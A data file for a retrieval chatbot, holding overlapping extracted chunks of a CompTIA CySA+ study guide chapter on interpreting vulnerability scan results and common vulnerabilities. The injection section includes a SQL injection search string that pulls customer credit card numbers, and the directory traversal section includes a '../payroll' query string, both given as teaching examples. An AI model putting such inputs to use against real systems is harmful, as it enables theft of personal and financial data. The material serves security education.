rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	Exceptions In some cases, an organization may decide not to remediate a vulnerability for one reason or another. For example, the organization may decide that business requirements dictate the use of an operating system that is no longer supported. Similarly, development managers may decide that the cost of remediating a vulnerability in a web application that is exposed only to the internal network outweighs the security benefit. Unless analysts take some action to record these exceptions, vulnerability scans will continue to report them each time a scan runs. It’s good practice to document exceptions in the vulnerability management system so that the scanner knows to ignore them in future reports. This reduces the level of noise in scan reports and increases their usefulness to analysts. Be careful when deciding to allow an exception. As discussed in Chapter 6, many organizations are subject to compliance requirements for vulnerability scanning. Creating an exception may violate those compliance obligations or go against best practices for security. Understanding Informational Results Vulnerability scanners often supply very detailed information when run using default configurations. Not everything reported by a vulnerability scanner represents a significant security issue. Nevertheless, scanners provide as much information as they are able to determine to show the types of information that an attacker might be able to gather when conducting a reconnaissance scan. Figure 7.3 provides an example of a high-­level report generated from a vulnerability scan run against a web server. Note that about two-­thirds of the vulnerabilities in this report fit into the “Info” risk category. This indicates that the plug-­ins providing results are not even categorized according to the CVSS. Instead, they are simply informational results. Most organizations do not go to the extent of removing all possible sources of information about a system because it can be difficult, if not impossible, to do so. 258 Chapter 7 F I G U R E 7. 3 ■ Analyzing Vulnerability Scans Scan report showing vulnerabilities and best practices A cybersecurity analyst encountering the scan report in Figure 7.3 should first turn their attention to the high-­severity SQL injection vulnerability that exists. Once that is remediated, seven medium-­severity vulnerabilities require attention. The remaining informational vulnerabilities can likely be left alone. Many organizations will adopt a formal policy regarding how they handle these informational messages. For example, some organizations may decide that once a message appears in two or three consecutive scans, they will create a journal entry documenting the actions they took in response to the message or the reasons they chose not to take actions. This approach is particularly important for highly audited organizations that have stringent compliance requirements. Creating a formal record of the decision-­making process satisfies auditors that the organization conducted due diligence. Reconciling Scan Results with Other Data Sources Vulnerability scans should never take place in a vacuum. Cybersecurity analysts interpreting these reports should also turn to other sources of security information as they perform their analysis. Valuable information sources for this process include the following: Logs
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	they will create a journal entry documenting the actions they took in response to the message or the reasons they chose not to take actions. This approach is particularly important for highly audited organizations that have stringent compliance requirements. Creating a formal record of the decision-­making process satisfies auditors that the organization conducted due diligence. Reconciling Scan Results with Other Data Sources Vulnerability scans should never take place in a vacuum. Cybersecurity analysts interpreting these reports should also turn to other sources of security information as they perform their analysis. Valuable information sources for this process include the following: Logs from servers, applications, network devices, and other sources that might contain information about possible attempts to exploit detected vulnerabilities Validating Scan Results 259 Security information and event management (SIEM) systems that correlate log entries from multiple sources and provide actionable intelligence Configuration management systems that provide information on the operating system and applications installed on a system Each of these information sources can prove invaluable when an analyst attempts to reconcile a scan report with the reality of the organization’s computing environment. Trend Analysis Trend analysis is also an important part of a vulnerability scanning program. Managers should watch for overall trends in vulnerabilities, including the number of new vulnerabilities arising over time, the age of existing vulnerabilities, and the time required to remediate vulnerabilities. Figure 7.4 shows an example of the trend analysis reports available in Nessus SecurityCenter. F I G U R E 7. 4 Vulnerability trend analysis Source: Tenable Network Security Context Awareness As you evaluate a vulnerability, you also must factor in the specific context of your organization and the environment where the vulnerability was discovered. For example, a vulnerability on a system that is directly connected to the Internet would be much more severe than one found on an internal system or a system on an isolated network. 260 Chapter 7 ■ Analyzing Vulnerability Scans Similarly, the asset value of the affected systems should also play a role in prioritizing remediation efforts. Higher value assets present more risk to the organization and should be higher on the remediation priority list. Zero-­Day Attacks Sophisticated attackers often conduct their own security vulnerability research in an attempt to discover vulnerabilities that are not known to other attackers or cybersecurity teams. After they uncover a vulnerability, they do not disclose it but rather store it in a vulnerability repository for later use. Attacks that exploit these vulnerabilities are known as zero-­day attacks. Zero-­day attacks are particularly dangerous because they are unknown to product vendors, and therefore, no patches are available to correct them. Advanced persistent threat (APT) actors who exploit zero-­day vulnerabilities are often able to easily compromise their targets. Stuxnet is one of the most well-­known examples of a sophisticated attack. The Stuxnet attack, traced to the U.S. and Israeli governments, exploited zero-­day vulnerabilities to compromise the control networks at an Iranian uranium enrichment facility. Common Vulnerabilities Each vulnerability scanning system contains plug-­ins able to detect thousands of
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	for later use. Attacks that exploit these vulnerabilities are known as zero-­day attacks. Zero-­day attacks are particularly dangerous because they are unknown to product vendors, and therefore, no patches are available to correct them. Advanced persistent threat (APT) actors who exploit zero-­day vulnerabilities are often able to easily compromise their targets. Stuxnet is one of the most well-­known examples of a sophisticated attack. The Stuxnet attack, traced to the U.S. and Israeli governments, exploited zero-­day vulnerabilities to compromise the control networks at an Iranian uranium enrichment facility. Common Vulnerabilities Each vulnerability scanning system contains plug-­ins able to detect thousands of possible vulnerabilities, ranging from major SQL injection flaws in web applications to more mundane information disclosure issues with network devices. Though it’s impossible to discuss each of these vulnerabilities in a book of any length, cybersecurity analysts should be familiar with the most commonly detected vulnerabilities and some of the general categories that cover many different vulnerability variants. Chapter 6 discussed the importance of regularly updating vulnerability scanners to make them effective against newly discovered threats. Although this is true, it is also important to note that even old vulnerabilities can present significant issues to the security of organizations. Each year Verizon conducts a widely respected analysis of all the data breaches they investigated over the course of the prior year. Figure 7.5 shows some of the results from the 2016 Data Breach Investigations Report. (Note that Verizon does continue to produce these reports on an annual basis, but they no longer include year of discovery data.) Figure 7.5 underscores the importance of addressing old vulnerabilities and the stark reality that many organizations fail to do so. Many of the vulnerabilities exploited during data breaches exploited vulnerabilities discovered more than a decade earlier. That’s an astounding statistic. Common Vulnerabilities F I G U R E 7. 5 261 Vulnerabilities exploited in 2015 by year of initial discovery 100 CVEs successfully exploited in 2015 80 60 40 20 0 2015 2013 2011 2009 2007 2005 2003 2001 1999 CVE publication date To see the Verizon 2022 Data Breach Investigations Report, visit www.verizon.com/business/resources/reports/dbir. Server and Endpoint Vulnerabilities Computer systems are quite complex. The operating systems run on both servers and endpoints comprising millions of lines of code, and the differing combinations of applications they run make each system fairly unique. It’s no surprise, therefore, that many of the vulnerabilities detected by scans exist on server and endpoint systems, and these vulnerabilities are often among the most complex to remediate. Missing Patches Applying security patches to systems should be one of the core practices of any information security program, but this routine task is often neglected due to a lack of resources for preventive maintenance. One of the most common alerts from a vulnerability scan is that one or more systems on the network are running an outdated version of an operating system or application and require security patches. Figure 7.6 shows an example of one of these scan results. The server located
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	exist on server and endpoint systems, and these vulnerabilities are often among the most complex to remediate. Missing Patches Applying security patches to systems should be one of the core practices of any information security program, but this routine task is often neglected due to a lack of resources for preventive maintenance. One of the most common alerts from a vulnerability scan is that one or more systems on the network are running an outdated version of an operating system or application and require security patches. Figure 7.6 shows an example of one of these scan results. The server located at 10.64.142.211 has a remote code execution vulnerability. Though the scan result is fairly brief, it does contain quite a bit of helpful information: The description tells us that this is a flaw in the Windows HTTP stack. 262 Chapter 7 F I G U R E 7. 6 ■ Analyzing Vulnerability Scans Missing patch vulnerability The service information in the Output section of the report confirms that the server is running an HTTPS service on TCP port 443. We see in the header that this is a critical vulnerability, and this is confirmed in the Risk Information section, where we see that it has a CVSS base score of 10. Fortunately, there is an easy way to fix this problem. The Solution section tells us that Microsoft released patches for the affected operating systems, and the See Also section provides a direct link to the Microsoft security bulletin (MS15-­034) that describes the issue and solution in greater detail. Mobile Device Security This section refers to the vulnerabilities typically found on traditional servers and endpoints, but it’s important to note that mobile devices have a host of security issues of their own and must be carefully managed and patched to remain secure. The administrators of mobile devices can use a mobile device management (MDM) solution to manage the configuration of those devices, automatically installing patches, requiring the use of encryption, and providing remote wiping functionality. MDM solutions may also restrict the applications that can be run on a mobile device to those that appear on an approved list. Common Vulnerabilities 263 That said, mobile devices do not typically show up on vulnerability scans because they are not often sitting on the network when those scans run. Therefore, administrators should pay careful attention to the security of those devices even when they do not show up as requiring attention after a vulnerability scan. End-­of-­Life or Outdated Components Software vendors eventually discontinue support for every product they make. This is true for operating systems as well as applications. Once they announce the final end of support for a product, organizations that continue running the outdated software put themselves at a significant risk of attack. The vendor simply will not investigate or correct security flaws that arise in the product after that date. Organizations continuing to run the unsupported product are on their own from a security perspective, and unless you happen to
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	they do not show up as requiring attention after a vulnerability scan. End-­of-­Life or Outdated Components Software vendors eventually discontinue support for every product they make. This is true for operating systems as well as applications. Once they announce the final end of support for a product, organizations that continue running the outdated software put themselves at a significant risk of attack. The vendor simply will not investigate or correct security flaws that arise in the product after that date. Organizations continuing to run the unsupported product are on their own from a security perspective, and unless you happen to maintain a team of operating system developers, that’s not a good situation to find yourself in. Perhaps the most famous end of support for a major operating system occurred in July 2015 when Microsoft discontinued support for the more-­than-­a-­decade-­old Windows Server 2003. Figure 7.7 shows an example of the report generated by Nessus when it identifies a server running this outdated operating system. F I G U R E 7. 7 Unsupported operating system vulnerability 264 Chapter 7 ■ Analyzing Vulnerability Scans We can see from this report that the scan detected two servers on the network running Windows Server 2003. The description of the vulnerability provides a stark assessment of what lies in store for organizations continuing to run any unsupported operating system: Lack of support implies that no new security patches for the product will be released by the vendor. As a result, it is likely to contain security vulnerabilities. Furthermore, Microsoft is unlikely to investigate or acknowledge reports of vulnerabilities. The solution for organizations running unsupported operating systems is simple in its phrasing but complex in implementation. “Upgrade to a version of Windows that is currently supported” is a pretty straightforward instruction, but it may pose a significant challenge for organizations running applications that simply can’t be upgraded to newer versions of Windows. Security professionals should stay up-­to-­date on product and service life cycle information to help them plan and mitigate upcoming product end of life (EOL) circumstances. Many vendors provide detailed information on their websites to help forecast upcoming EOL events. For example, Microsoft provides this information at https://learn.microsoft .com/en-­us/lifecycle/products. In cases where the organization simply must continue using an unsupported operating system, best practice dictates isolating the system as much as possible, preferably not connecting it to any network, and applying as many compensating security controls as possible, such as increased monitoring and implementation of strict network firewall rules. You’ll learn more about compensating controls in Chapter 8, “Responding to Vulnerabilities.” Buffer Overflows Buffer overflow attacks occur when an attacker manipulates a program into placing more data into an area of memory than is allocated for that program’s use. The goal is to overwrite other information in memory with instructions that may be executed by a different process running on the system. Buffer overflow attacks are quite commonplace and tend to persist for many years after they are initially discovered. For example, the Verizon Data
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	controls as possible, such as increased monitoring and implementation of strict network firewall rules. You’ll learn more about compensating controls in Chapter 8, “Responding to Vulnerabilities.” Buffer Overflows Buffer overflow attacks occur when an attacker manipulates a program into placing more data into an area of memory than is allocated for that program’s use. The goal is to overwrite other information in memory with instructions that may be executed by a different process running on the system. Buffer overflow attacks are quite commonplace and tend to persist for many years after they are initially discovered. For example, the Verizon Data Breach Investigation Report identified 10 vulnerabilities that were responsible for 85 percent of the compromises in their study. Among the top 10 were four overflow issues: CVE 1999-­1058: Buffer overflow in Vermillion FTP Daemon CVE 2001-­0876: Buffer overflow in Universal Plug and Play (UPnP) on Windows 98, 98SE, ME, and XP CVE 2002-­0126: Buffer overflow in BlackMoon FTP Server 1.0 through 1.5 CVE 2003-­0818: Multiple integer overflows in Microsoft ASN.1 library Common Vulnerabilities 265 Exam Note One of the listed vulnerabilities is an integer overflow. This is simply a variant of a buffer overflow where the result of an arithmetic operation attempts to store an integer that is too large to fit in the specified buffer. The four-­digit number following the letters CVE in each vulnerability title indicates the year that the vulnerability was discovered. In a recent study of breaches, four of the top 10 issues causing breaches were exploits of overflow vulnerabilities that were between 12 and 16 years old! Cybersecurity analysts discovering a buffer overflow vulnerability during a vulnerability scan should seek out a patch that corrects the issue. In most cases, the scan report will directly identify an available patch. Exam Note Buffer overflows may target two different types of memory. Stack overflows target the stack, which stores variable values and is managed by the operating system. Heap overflows target the heap, which stores objects created by code and must be managed by application developers. Privilege Escalation Privilege escalation attacks seek to increase the level of access that an attacker has to a target system. They exploit vulnerabilities that allow the transformation of a normal user account into a more privileged account, such as the root superuser account. In October 2016, security researchers announced the discovery of a Linux kernel vulnerability dubbed Dirty COW. This vulnerability, present in the Linux kernel for nine years, was extremely easy to exploit and provided successful attackers with administrative control of affected systems. In an attempt to spread the word about this vulnerability and encourage prompt patching of Linux kernels, security researchers set up the DirtyCOW.ninja website, shown in Figure 7.8. This site provides details on the flaw and corrective measures. Rootkits are hacking tools designed to automate privilege escalation attacks. An attacker who gains access to a normal user account may use a rootkit to exploit a vulnerability and perform a privilege escalation attack, seeking to gain administrative privileges.
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	present in the Linux kernel for nine years, was extremely easy to exploit and provided successful attackers with administrative control of affected systems. In an attempt to spread the word about this vulnerability and encourage prompt patching of Linux kernels, security researchers set up the DirtyCOW.ninja website, shown in Figure 7.8. This site provides details on the flaw and corrective measures. Rootkits are hacking tools designed to automate privilege escalation attacks. An attacker who gains access to a normal user account may use a rootkit to exploit a vulnerability and perform a privilege escalation attack, seeking to gain administrative privileges. 266 Chapter 7 F I G U R E 7. 8 ■ Analyzing Vulnerability Scans Dirty COW website Remote Code Execution Code execution vulnerabilities allow an attacker to run software of their choice on the targeted system. This can be a catastrophic event, particularly if the vulnerability allows the attacker to run the code with administrative privileges. Remote code execution vulnerabilities are an even more dangerous subset of code execution vulnerabilities because the attacker can exploit the vulnerability over a network connection without having physical or logical access to the target system. Figure 7.9 shows an example of a remote code execution vulnerability detected by Nessus. Notice that the CVSS access vector shows that the access vector for this vulnerability is network-based. This is consistent with the description of a remote code execution vulnerability. The impact metrics in the vector show that the attacker can exploit this vulnerability to completely compromise the system. Fortunately, as with most vulnerabilities detected by scans, there is an easy fix for the problem. Microsoft issued patches for the versions of Windows affected by the issue and describes them in Microsoft Security Bulletin MS14-­066. Common Vulnerabilities F I G U R E 7. 9 267 Code execution vulnerability Insecure Design Many of the older protocols used on networks in the early days of the Internet were designed without security in mind. They often failed to use encryption to protect usernames, passwords, and the content sent over an open network, exposing the users of the protocol to eavesdropping attacks. Telnet is one example of an insecure protocol used to gain command-­ line access to a remote server. The File Transfer Protocol (FTP) provides the ability to transfer files between systems but does not incorporate security features. Figure 7.10 shows an example of a scan report that detected a system that supports the insecure FTP protocol. The solution for this issue is to simply switch to a more secure protocol. Fortunately, encrypted alternatives exist for both Telnet and FTP. System administrators can use Secure Shell (SSH) as a secure replacement for Telnet when seeking to gain command-­line access to a remote system. Similarly, the Secure File Transfer Protocol (SFTP) and FTP-­Secure (FTPS) both provide a secure method to transfer files between systems. 268 Chapter 7 F I G U R E 7. 10 ■ Analyzing Vulnerability Scans FTP cleartext authentication vulnerability Security Misconfiguration Systems may be misconfigured
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	detected a system that supports the insecure FTP protocol. The solution for this issue is to simply switch to a more secure protocol. Fortunately, encrypted alternatives exist for both Telnet and FTP. System administrators can use Secure Shell (SSH) as a secure replacement for Telnet when seeking to gain command-­line access to a remote system. Similarly, the Secure File Transfer Protocol (SFTP) and FTP-­Secure (FTPS) both provide a secure method to transfer files between systems. 268 Chapter 7 F I G U R E 7. 10 ■ Analyzing Vulnerability Scans FTP cleartext authentication vulnerability Security Misconfiguration Systems may be misconfigured in a way that allows attackers to gain information about the system’s security settings or even to allow them to exploit a misconfigured system. Many application development platforms support debug modes that give developers crucial information needed to troubleshoot applications in the development process. Debug mode typically provides detailed information on the inner workings of an application and a server, as well as supporting databases. Although this information can be useful to developers, it can inadvertently assist an attacker seeking to gain information about the structure of a database, authentication mechanisms used by an application, or other details. For this reason, vulnerability scans do alert on the presence of debug mode on scanned servers. Figure 7.11 shows an example of this type of scan result. In this example, the target system appears to be a Windows Server supporting the ASP .NET development environment. The Output section of the report demonstrates that the server responds when sent a DEBUG request by a client. Solving this issue requires the cooperation of developers and disabling debug modes on systems with public exposure. In mature organizations, software development should always take place in a dedicated development environment that is only accessible from private networks. Developers should be encouraged (or ordered!) to conduct their testing only on systems dedicated to that purpose, and it would be entirely appropriate to enable debug mode on those servers. There should be no need for supporting this capability on public-­facing systems. Common Vulnerabilities F I G U R E 7. 11 269 Debug mode vulnerability Network Vulnerabilities Modern interconnected networks use a complex combination of infrastructure components and network appliances to provide widespread access to secure communications capabilities. These networks and their component parts are also susceptible to security vulnerabilities that may be detected during a vulnerability scan. Missing Firmware Updates Operating systems and applications aren’t the only devices that require regular security updates. Vulnerability scans may also detect security problems in network devices that require firmware updates from the manufacturer to correct. These vulnerabilities result in 270 Chapter 7 ■ Analyzing Vulnerability Scans reports similar to the operating system missing patch report in Figure 7.6 and typically direct administrators to the location on the vendor’s site where the firmware update is available for download. Cryptographic Failures The Secure Sockets Layer (SSL) protocol and its successor, Transport Layer Security (TLS), offer a secure means to exchange information over the
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	Firmware Updates Operating systems and applications aren’t the only devices that require regular security updates. Vulnerability scans may also detect security problems in network devices that require firmware updates from the manufacturer to correct. These vulnerabilities result in 270 Chapter 7 ■ Analyzing Vulnerability Scans reports similar to the operating system missing patch report in Figure 7.6 and typically direct administrators to the location on the vendor’s site where the firmware update is available for download. Cryptographic Failures The Secure Sockets Layer (SSL) protocol and its successor, Transport Layer Security (TLS), offer a secure means to exchange information over the Internet and private networks. Although these protocols can be used to encrypt almost any type of network communication, they are most commonly used to secure connections to web servers and are familiar to end users as the “S” in HTTPS. Many cybersecurity analysts incorrectly use the acronym SSL to refer to both the SSL and TLS protocols. It’s important to understand that SSL is no longer secure and should not be used. TLS is a replacement for SSL that offers similar functionality but does not have the security flaws contained in SSL. Be careful to use this terminology precisely and question those who use the term SSL about whether they are really referring to TLS to avoid ambiguity. Outdated SSL/TLS Versions SSL is no longer considered secure and should not be used on production systems. The same is true for early versions of TLS. Vulnerability scanners may report that web servers are using these protocols, and cybersecurity analysts should understand that any connections making use of these outdated versions of SSL and TLS may be subject to eavesdropping attacks. Figure 7.12 shows an example of a scan report from a network containing multiple systems that support the outdated SSL version 3. The administrators of servers supporting outdated versions of SSL and TLS should disable support for these older protocols on their servers and support only newer protocols, such as TLS versions 1.2 or 1.3. Insecure Cipher Use SSL and TLS are commonly described as cryptographic algorithms, but in fact, this is not the case. The SSL and TLS protocols describe how cryptographic ciphers may be used to secure network communications, but they are not cryptographic ciphers themselves. Instead, they allow administrators to designate the cryptographic ciphers that can be used with those protocols on a server-­by-­server basis. When a client and server wish to communicate using SSL/TLS, they exchange a list of ciphers that each system supports and agree on a mutually acceptable cipher. Some ciphers contain vulnerabilities that render them insecure because of their susceptibility to eavesdropping attacks. For example, Figure 7.13 shows a scan report from a system that supports the insecure RC4 cipher. Common Vulnerabilities F I G U R E 7. 1 2 271 Outdated SSL version vulnerability Solving this common problem requires altering the set of supported ciphers on the affected server and ensuring that only secure ciphers are used. Certificate Problems SSL and TLS
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	and server wish to communicate using SSL/TLS, they exchange a list of ciphers that each system supports and agree on a mutually acceptable cipher. Some ciphers contain vulnerabilities that render them insecure because of their susceptibility to eavesdropping attacks. For example, Figure 7.13 shows a scan report from a system that supports the insecure RC4 cipher. Common Vulnerabilities F I G U R E 7. 1 2 271 Outdated SSL version vulnerability Solving this common problem requires altering the set of supported ciphers on the affected server and ensuring that only secure ciphers are used. Certificate Problems SSL and TLS rely on the use of digital certificates to validate the identity of servers and exchange cryptographic keys. Website users are familiar with the error messages displayed in web browsers, such as that shown in Figure 7.14. These errors often contain extremely important information about the security of the site being accessed but, unfortunately, are all too often ignored. Vulnerability scans may also detect issues with the certificates presented by servers that support SSL and/or TLS. Common errors include the following: 272 Chapter 7 F I G U R E 7. 1 3 ■ Analyzing Vulnerability Scans Insecure SSL cipher vulnerability Mismatch Between the Name on the Certificate and the Name of the Server This is a very serious error because it may indicate the use of a certificate taken from another site. It’s the digital equivalent of someone using a fake ID “borrowed” from a friend. Expiration of the Digital Certificate Digital certificates have validity periods and expiration dates. When you see an expired certificate, it most likely means that the server administrator failed to renew the certificate in a timely manner. Unknown Certificate Authority (CA) Anyone can create a digital certificate, but digital certificates are useful only if the recipient of a certificate trusts the entity that issued it. Operating systems and browsers contain instructions to trust well-­known CAs but will show an error if they encounter a certificate issued by an unknown or untrusted CA. Common Vulnerabilities F I G U R E 7. 1 4 273 Invalid certificate warning The error shown in Figure 7.14 indicates that the user is attempting to access a website that is presenting an invalid certificate. From the URL bar, we see that the user is attempting to access BankofAmerica.com. However, looking in the details section, we see that the certificate being presented was issued to SouthwestWifi.com. This is a typical occurrence on networks that use a captive portal to authenticate users joining a public wireless network. This example is from the in-­flight Wi-­Fi service offered by Southwest Airlines. The error points out to the user that they are not communicating with the intended website owned by Bank of America and should not provide sensitive information. 274 Chapter 7 ■ Analyzing Vulnerability Scans Internal IP Disclosure IP addresses come in two variants: public IP addresses, which can be routed over the Internet, and private IP addresses, which can be used only on
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	presented was issued to SouthwestWifi.com. This is a typical occurrence on networks that use a captive portal to authenticate users joining a public wireless network. This example is from the in-­flight Wi-­Fi service offered by Southwest Airlines. The error points out to the user that they are not communicating with the intended website owned by Bank of America and should not provide sensitive information. 274 Chapter 7 ■ Analyzing Vulnerability Scans Internal IP Disclosure IP addresses come in two variants: public IP addresses, which can be routed over the Internet, and private IP addresses, which can be used only on local networks. Any server that is accessible over the Internet must have a public IP address to allow that access, but that address is typically managed by a firewall that uses network address translation (NAT) to map that public address to the server’s true, private IP address. Systems on the local network can use the server’s private address to access it directly, but remote systems should never be aware of that address. Servers that are not properly configured may leak their private IP addresses to remote systems. This can occur when the system includes its own IP address in the header information returned in the response to an HTTP request. The server is not aware that NAT is in use, so it uses the private address in its response. Attackers can use this information to learn more about the internal configuration of a firewalled network. Figure 7.15 shows an example of this type of information disclosure vulnerability. F I G U R E 7. 1 5 Internal IP disclosure vulnerability Common Vulnerabilities 275 Critical Infrastructure and Operational Technology In some environments, cybersecurity analysts may encounter the use of supervisory control and data acquisition (SCADA) systems, industrial control systems (ICSs), the Internet of Things (IoT), and other examples of operational technology (OT). These systems allow the connection of physical devices and processes to networks and provide tremendous sources of data for organizations seeking to make their business processes more efficient and effective. However, they also introduce new security concerns that may arise on vulnerability scans. The IoT world also extends to include systems related to the management of physical infrastructure. For example, physical access control systems often interact with IoT devices at turnstiles, doors, gates, and other facility entry points. Building automation systems interact with heating, ventilation, and air conditioning (HVAC) systems, fire suppression systems, and other building controls. All of these systems tie together with workflow and process automation systems designed to reduce the burden on human staff. Industrial control systems rely on a series of sensors and controllers distributed throughout the organization, collecting information and controlling activities. Programmable logic controllers (PLCs) are specialized hardware controllers designed to operate in an IoT environment. PLCs often use a specialized communication protocol called Modbus to communicate with sensors and other IoT components over wired serial interfaces. Some of the most critical IoT deployments are those found on vehicles and drones. These systems
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	systems, fire suppression systems, and other building controls. All of these systems tie together with workflow and process automation systems designed to reduce the burden on human staff. Industrial control systems rely on a series of sensors and controllers distributed throughout the organization, collecting information and controlling activities. Programmable logic controllers (PLCs) are specialized hardware controllers designed to operate in an IoT environment. PLCs often use a specialized communication protocol called Modbus to communicate with sensors and other IoT components over wired serial interfaces. Some of the most critical IoT deployments are those found on vehicles and drones. These systems have a dramatic impact on the safety of human life and should be carefully monitored for security issues. As with any other device on a network, IoT devices may have security vulnerabilities and are subject to network-­based attacks. However, it is often more difficult to patch IoT devices than their traditional server counterparts because it is difficult to obtain patches. IoT device manufacturers may not use automatic update mechanisms, and the only way that cybersecurity analysts may become aware of an update is through a vulnerability scan or by proactively subscribing to the security bulletins issued by IoT device manufacturers. IoT Uprising On October 21, 2016, a widespread distributed denial-­of-­service (DDoS) attack shut down large portions of the Internet, affecting services run by Amazon, The New York Times, Twitter, Box, and other providers. The attack came in waves over the course of the day and initially mystified technologists seeking to bring systems back online. Investigation later revealed that the outages occurred when Dyn, a global provider of DNS services, suffered a debilitating attack that prevented it from answering DNS queries. Dyn received massive amounts of traffic that overwhelmed its servers. The source of all of that traffic? Attackers used an IoT botnet named Mirai to leverage the bandwidth available to baby monitors, DVRs, security cameras, and other IoT devices in the homes of normal people. Those botnetted devices received instructions from a yet-­ unknown attacker to simultaneously bombard Dyn with requests, knocking it (and a good part of the Internet!) offline. 276 Chapter 7 ■ Analyzing Vulnerability Scans Web Application Vulnerabilities Web applications are complex environments that often rely not only on web servers but also on backend databases, authentication servers, and other components to provide services to end users. These web applications may also contain security holes that allow attackers to gain a foothold on a network, and modern vulnerability scanners are able to probe web applications for these vulnerabilities. Injection Flaws Injection flaws occur when an attacker is able to send commands through a web server to a backend system, bypassing normal security controls and fooling the backend system into believing that the request came from the web server. The most common form of this attack is the SQL injection attack, which exploits web applications to send unauthorized commands to a backend database server. Web applications often receive input from users and use it to compose a database
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	attackers to gain a foothold on a network, and modern vulnerability scanners are able to probe web applications for these vulnerabilities. Injection Flaws Injection flaws occur when an attacker is able to send commands through a web server to a backend system, bypassing normal security controls and fooling the backend system into believing that the request came from the web server. The most common form of this attack is the SQL injection attack, which exploits web applications to send unauthorized commands to a backend database server. Web applications often receive input from users and use it to compose a database query that provides results that are sent back to a user. For example, consider the search function on an e-­commerce site. If a user enters orange tiger pillows into the search box, the web server needs to know what products in the catalog might match this search term. It might send a request to the backend database server that looks something like this: SELECT ItemName, ItemDescription, ItemPrice FROM Products WHERE ItemName LIKE '%orange%' AND ItemName LIKE '%tiger%' AND ItemName LIKE '%pillow%' This command retrieves a list of items that can be included in the results returned to the end user. In a SQL injection attack, the attacker might send a very unusual-­looking request to the web server, perhaps searching for: orange tiger pillow'; SELECT CustomerName, CreditCardNumber FROM Orders; -­ -­ If the web server simply passes this request along to the database server, it would do this (with a little reformatting for ease of viewing): SELECT ItemName, ItemDescription, ItemPrice FROM Products WHERE ItemName LIKE '%orange%' AND ItemName LIKE '%tiger%' AND ItemName LIKE '%pillow'; SELECT CustomerName, CreditCardNumber FROM Orders; -­-­%' Common Vulnerabilities 277 This command, if successful, would run two different SQL queries (separated by the semicolon). The first would retrieve the product information, and the second would retrieve a listing of customer names and credit card numbers. The two best ways to protect against SQL injection attacks are input validation and the enforcement of least privilege restrictions on database access. Input validation ensures that users don’t provide unexpected text to the web server. It would block the use of the apostrophe that is needed to “break out” of the original SQL query. Least privilege restricts the tables that may be accessed by a web server and can prevent the retrieval of credit card information by a process designed to handle catalog information requests. Exam Note Injection attacks are not limited to SQL and databases. Cybersecurity professionals should also be vigilant for similar attacks that seek to introduce user-­supplied, malicious content into Extensible Markup Language (XML) documents and Lightweight Directory Access Protocol (LDAP) queries. Vulnerability scanners can detect injection vulnerabilities, such as the one shown in Figure 7.16. When cybersecurity analysts notice a potential injection vulnerability, they should work closely with developers to validate that the vulnerability exists and fix the affected code. Cross-­Site Scripting In a cross-­site scripting (XSS) attack, an attacker embeds scripting commands on a website that will
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	catalog information requests. Exam Note Injection attacks are not limited to SQL and databases. Cybersecurity professionals should also be vigilant for similar attacks that seek to introduce user-­supplied, malicious content into Extensible Markup Language (XML) documents and Lightweight Directory Access Protocol (LDAP) queries. Vulnerability scanners can detect injection vulnerabilities, such as the one shown in Figure 7.16. When cybersecurity analysts notice a potential injection vulnerability, they should work closely with developers to validate that the vulnerability exists and fix the affected code. Cross-­Site Scripting In a cross-­site scripting (XSS) attack, an attacker embeds scripting commands on a website that will later be executed by an unsuspecting visitor accessing the site. The idea is to trick a user visiting a trusted site into executing malicious code placed there by an untrusted third party. Cross-­site scripting attacks arise in two different forms: Persistent XSS attacks occur when the attacker is able to actually store the attack code on a server. This code remains on the server, waiting for a user to request the affected content. These attacks are also known as stored XSS attacks. Reflected XSS attacks occur when the attacker tricks a user into sending the attack to the server as part of a query string or other content. The server then sends the attack back to the user (reflecting it), causing the code to execute. 278 Chapter 7 F I G U R E 7. 1 6 ■ Analyzing Vulnerability Scans SQL injection vulnerability Exam Note Each of these XSS attack types is covered separately in the CySA+ exam objectives. Make certain that you understand the differences between them as you prepare for the exam. Figure 7.17 shows an example of an XSS vulnerability detected during a Nessus vulnerability scan. Cybersecurity analysts discovering potential XSS vulnerabilities during a scan should work with developers to assess the validity of the results and implement appropriate controls to prevent this type of attack, such as input validation. Common Vulnerabilities F I G U R E 7. 17 279 Cross-­site scripting vulnerability Directory Traversal In a directory traversal attack, the attacker inserts filesystem path values into a query string, seeking to navigate to a file located in an area not normally authorized for public access. These attacks may occur when filenames are included in query strings. For example, if a web application retrieves policy documents from a remote storage device, it might include the name of the policy in a query string, such as this one: www.myserver.com/policy?document='aup.pdf' The web application might see this query string and then go to the policy store and retrieve a document called aup.pdf. If an attacker knows that the policy store is located on the same server as payroll records, they might try using the following query string to retrieve Mike’s payroll records: www.myserver.com/policy?document='../payroll/mike.pdf' 280 Chapter 7 ■ Analyzing Vulnerability Scans This query string seeks to traverse the directory structure of the storage server, navigating up to the parent directory of the policy folder and then down into the
